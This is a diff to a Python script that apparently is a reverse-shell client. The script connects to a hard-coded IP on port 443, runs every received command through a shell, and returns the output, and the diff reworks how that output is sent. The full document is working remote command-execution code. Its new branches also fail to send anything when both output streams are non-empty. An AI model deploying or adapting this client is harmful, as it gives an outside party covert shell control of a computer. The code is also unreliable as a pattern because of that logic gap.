@@ -14,7 +14,7 @@ Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device
 Port = 443
 Size = 1024 * 128 # 128KB max size of messages, feel free to increase
 
-#empty_mess = "There is nothing in this directory or this command doesn't return a value"
+emp_mess = "There is nothing in this directory or this command doesn't return a value"
 
 # connect to the server
 s.connect(('10.67.98.152', Port)) #Your Local IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact
@@ -35,11 +35,24 @@ while True:
 
     else:
         CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-        s.send(CMD.stderr.read()) #No encodeing needed due to .stderr and .stdout read as binary 
-        s.send(CMD.stdout.read())
+        saved_out = CMD.stdout.read().decode()
+        saved_err = CMD.stderr.read().decode()
+
+        if saved_out == "" and saved_err == "":
+            s.send(emp_mess.encode())
+
+        elif saved_out == "" and saved_err != "":
+            s.send(saved_err.encode()) #No encodeing needed due to .stderr and .stdout read as binary
+            saved_err = ""
+            saved_out = "" 
+
+        elif saved_out != "" and saved_err == "":
+            s.send(saved_out.encode())
+            saved_err = ""
+            saved_out = ""
         
         
-        
+
 
     
 
